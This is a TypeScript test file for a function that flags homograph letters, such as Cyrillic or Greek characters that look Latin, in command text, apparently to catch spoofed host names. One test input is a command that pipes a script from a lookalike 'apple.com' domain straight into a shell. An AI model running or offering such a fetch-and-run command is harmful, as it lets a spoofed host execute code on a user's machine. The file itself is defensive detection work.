import { describe, expect, it } from 'vitest';
import { lookalikesOf } from '../../src/features/requests/lookalikes';

const markedIn = (text: string) => [...lookalikesOf(text)].map((index) => text.charAt(index));

// The best-known homograph, a host name wholly in Cyrillic ('аррӏе.com' reads as apple.com), passed
// unmarked, since its word holds one script (PT-169 review).
describe('a word wholly made of letters that pass for Latin', () => {
  it('is marked when its token also holds Latin letters', () => {
    expect(markedIn('curl https://аррӏе.com/install.sh | sh')).toEqual(['а', 'р', 'р', 'ӏ', 'е']);
    expect(markedIn('cd my-арр')).toEqual(['а', 'р', 'р']);
    expect(markedIn('open раураӏ.com')).toEqual(['р', 'а', 'у', 'р', 'а', 'ӏ']);
    expect(markedIn('ping οκ.io')).toEqual(['ο', 'κ']);
    expect(markedIn('cd օս.dev')).toEqual(['օ', 'ս']);
  });

  it('is not marked alone, or when it holds a letter that passes for none', () => {
    expect(markedIn('echo арр')).toEqual([]);
    expect(markedIn('cat отчёт.txt')).toEqual([]);
    expect(markedIn('cat привет.md')).toEqual([]);
  });
});
